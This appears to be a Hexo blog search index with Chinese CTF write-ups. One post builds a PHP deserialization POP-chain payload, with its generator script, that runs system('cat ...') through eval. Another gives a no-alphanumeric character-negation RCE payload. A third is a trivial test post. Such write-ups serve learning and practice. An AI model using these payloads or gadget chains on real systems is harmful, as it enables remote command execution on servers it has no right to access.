<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>easy_serialize</title>
    <link href="/2023/04/23/easy-serialize/"/>
    <url>/2023/04/23/easy-serialize/</url>
    
    <content type="html"><![CDATA[<h1 id="easy-serialize"><a href="#easy-serialize" class="headerlink" title="easy_serialize"></a>easy_serialize</h1><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p>先上payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://124.220.165.133:9906/?a=O:5:&quot;Hello&quot;:2:&#123;s:6:&quot;source&quot;;N;s:3:&quot;str&quot;;O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;N;s:3:&quot;str&quot;;a:1:&#123;s:3:&quot;str&quot;;O:5:&quot;Uwant&quot;:1:&#123;s:6:&quot;params&quot;;s:32:&quot;system(&#x27;cat /ffffllllaaaagggg&#x27;);&quot;;&#125;&#125;&#125;;&#125;<br></code></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>先把网页上的代码拷到vscode里，以便后续查看和修改  </p><p><img src="https://cdn.staticaly.com/gh/sawtooth384/image@master/20230423/e1.35gzqjp3uli0.png" alt="e1">  </p><p>第40行有个<code>eval</code>函数，那就从这里倒推</p><p><code>eval</code>在<code>getshell</code>函数里，而<code>getshell</code>被<code>__get</code>函数调用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">__construct</span>()        <span class="hljs-comment">#当一个对象创建时触发     </span><br> <span class="hljs-title function_ invoke__">__destruct</span>()        <span class="hljs-comment">#当一个对象被销毁时触发      </span><br> <span class="hljs-title function_ invoke__">__toString</span>()        <span class="hljs-comment">#把类当作字符串使用时触发      </span><br> <span class="hljs-title function_ invoke__">__get</span>()             <span class="hljs-comment">#用于从不存在或不可访问的属性读取数据时      </span><br></code></pre></td></tr></table></figure><p>显然，在<code>Show</code>类的<code>__tostring()</code>中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-variable language_">$this</span>-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]-&gt;source;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$content</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>当<code>$this-&gt;str[&#39;str&#39;]</code>为类<code>Uwant</code>时，</p><p>这段代码会调用<code>Uwant</code>中不存在的<code>source</code>变量，导致触发<code>__get()</code>  </p><p>接下来，我们分析如何触发<code>__toString()</code>  </p><p>在<code>Hello</code>类中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hello</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;str=<span class="hljs-variable">$name</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;source=<span class="hljs-variable language_">$this</span>-&gt;str;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;source;      <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果<code>$this-&gt;source</code>为一个<code>Show</code>类的对象，</p><p>那么<code>__destruct()</code>中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;source;<br></code></pre></td></tr></table></figure><p>就是将<code>Show</code>类对象当作字符串使用，</p><p>即触发<code>__toString()</code>  </p><h2 id="分析总结"><a href="#分析总结" class="headerlink" title="分析总结"></a>分析总结</h2><p>我们需要序列化一个<code>Hello</code>类对象，</p><p>这个对象的<code>$str</code>为一个<code>Show</code>类对象，</p><p>该<code>Show</code>类对象的<code>$str[&#39;str&#39;]</code>为一个<code>Uwant</code>类对象。</p><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hello</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;str=<span class="hljs-variable">$name</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;source=<span class="hljs-variable language_">$this</span>-&gt;str;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;source;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><br><span class="hljs-class"></span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-comment">//由于直接赋值会报错，故通过构造函数间接赋值</span><br>        <span class="hljs-variable">$ad</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Uwant</span>();<br>        <span class="hljs-variable language_">$this</span>-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]=<span class="hljs-variable">$ad</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-variable language_">$this</span>-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]-&gt;source;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$content</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Uwant</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$params</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;params=<span class="hljs-string">&quot;system(&#x27;cat /ffffllllaaaagggg&#x27;);&quot;</span>;   <span class="hljs-comment">//这里填命令</span><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getshell</span>(<span class="hljs-variable">$this</span>-&gt;params);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getshell</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;params=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-string">&quot;点&quot;</span>,<span class="hljs-variable">$this</span>-&gt;params);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;params;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Uwant</span>());                 <span class="hljs-comment">//这里只是看看效果</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;                           <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>());<span class="hljs-comment">//同上</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$x</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>();<br><span class="hljs-variable">$c</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Hello</span>(<span class="hljs-variable">$x</span>));<span class="hljs-comment">//生成payload</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$c</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="意外"><a href="#意外" class="headerlink" title="意外"></a>意外</h2><p>实操中发现会报错</p><p><img src="https://cdn.staticaly.com/gh/sawtooth384/image@master/20230423/e2.1jp4y9bihbpc.png" alt="e2">  </p><p>这时就需要用前面两个输出进行类比和拼凑了</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://124.220.165.133:9906/?a=O:5:&quot;Hello&quot;:2:&#123;s:6:&quot;source&quot;;N;s:3:&quot;str&quot;;O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;N;s:3:&quot;str&quot;;a:1:&#123;s:3:&quot;str&quot;;O:5:&quot;Uwant&quot;:1:&#123;s:6:&quot;params&quot;;s:32:&quot;system(&#x27;cat /ffffllllaaaagggg&#x27;);&quot;;&#125;&#125;&#125;;&#125;<br></code></pre></td></tr></table></figure><h2 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h2><p>仅代表个人观点</p><ul><li>如何将<strong>类对象</strong>赋值给<strong>另一个类中的变量</strong>  </li><li>在无法直接获得payload时，利用已有信息构造payload  </li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>wp</tag>
      
      <tag>php</tag>
      
      <tag>反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>web第一周</title>
    <link href="/2023/01/15/web%E7%AC%AC%E4%B8%80%E5%91%A8/"/>
    <url>/2023/01/15/web%E7%AC%AC%E4%B8%80%E5%91%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="rce2-无字母数字绕过"><a href="#rce2-无字母数字绕过" class="headerlink" title="rce2 (无字母数字绕过)"></a>rce2 (无字母数字绕过)</h1><p><img src="https://cdn.staticaly.com/gh/sawtooth384/image@master/image.2i94qo6in3w0.webp" alt="image"></p><span id="more"></span><h2 id="相关基础知识的了解"><a href="#相关基础知识的了解" class="headerlink" title="相关基础知识的了解"></a>相关基础知识的了解</h2><p>preg_match( )函数：<a href="https://www.php.cn/php-weizijiaocheng-381228.html">php正则表达式中preg_match函数的详解-php教程-PHP中文网</a> </p><p>正则表达式：<a href="https://www.runoob.com/regexp/regexp-tutorial.html">正则表达式 – 教程 | 菜鸟教程 (runoob.com)</a></p><h2 id="题目内容理解"><a href="#题目内容理解" class="headerlink" title="题目内容理解"></a>题目内容理解</h2><p>题目中*preg_match()*过滤了<strong>a-z，0-9，A-Z</strong>字符，</p><p>而用*eval($code)*探索flag需要上述字符，</p><p>因此需要构造其他字符的变换(异或、或、取反等)以实现所需字符的变相输入。</p><h2 id="操作过程"><a href="#操作过程" class="headerlink" title="操作过程"></a>操作过程</h2><p>字符位运算无需多说，</p><p>使用文章<a href="https://blog.csdn.net/miuzzx/article/details/109143413"> 无字母数字绕过正则表达式总结（含上传临时文件、异或、或、取反、自增脚本）_yu22x的博客</a> 上的格式多次尝试，  </p><p>但是网页一片空白。</p><p>浏览别人的博客后，得知要使用<code>$&#123;_GET&#125;[a]($&#123;_GET&#125;[b]);&amp;a=***$b=***</code>格式  </p><p><img src="https://cdn.staticaly.com/gh/sawtooth384/image@master/rce2ffff.3gwo54ngd420.webp" alt="rce2ffff">于是<img src="https://cdn.staticaly.com/gh/sawtooth384/image@master/image.6e7j92zb3sg0.webp" alt="image"> </p><p>payload：<code>?code=$&#123;~%a0%b8%ba%ab&#125;[%aa]($&#123;~%a0%b8%ba%ab&#125;[%bb]);&amp;%aa=system&amp;%bb=cd%20/;cat ffffllllaaaagggg</code></p><h1 id="easy-ssit"><a href="#easy-ssit" class="headerlink" title="easy_ssit"></a>easy_ssit</h1><p><img src="https://cdn.staticaly.com/gh/sawtooth384/image@master/image.24no0lg8giow.webp" alt="imagegg">  </p><p><a href="https://www.freebuf.com/articles/web/279670.html">从0到1:Flask SSTI(服务器模板注入)</a>  </p><h2 id="题目内容理解-1"><a href="#题目内容理解-1" class="headerlink" title="题目内容理解"></a>题目内容理解</h2>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>第一周</tag>
      
      <tag>寒假</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>my-first-blog</title>
    <link href="/2023/01/15/my-first-blog/"/>
    <url>/2023/01/15/my-first-blog/</url>
    
    <content type="html"><![CDATA[<h1 id="新年快乐"><a href="#新年快乐" class="headerlink" title="新年快乐"></a>新年快乐</h1><hr><span id="more"></span><h2 id="Markdown体验还不错"><a href="#Markdown体验还不错" class="headerlink" title="Markdown体验还不错"></a>Markdown体验还不错</h2><hr><p>但是感觉下划线不是很明显啊。  </p><h1 id="新的尝试"><a href="#新的尝试" class="headerlink" title="新的尝试"></a>新的尝试</h1><p><strong>粗体</strong>与<em>斜体</em>  </p><h1 id="标题加粗会怎样"><a href="#标题加粗会怎样" class="headerlink" title="标题加粗会怎样"></a><strong>标题加粗会怎样</strong></h1><h2 id="不会怎样"><a href="#不会怎样" class="headerlink" title="不会怎样"></a>不会怎样</h2><hr><h1 id="神奇的引用"><a href="#神奇的引用" class="headerlink" title="神奇的引用"></a>神奇的引用</h1><blockquote><p>神奇的引用  </p><blockquote><p>神奇的引用</p><p><em>神奇的引用</em></p><ul><li>神奇的引用</li></ul></blockquote></blockquote><h1 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h1><hr><p><img src="https://cdn.staticaly.com/gh/sawtooth384/image@master/badgirl.5nlodbxdey80.webp" alt="badgirl"></p><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><p><code>安徽</code></p>]]></content>
    
    
    
    <tags>
      
      <tag>初体验</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
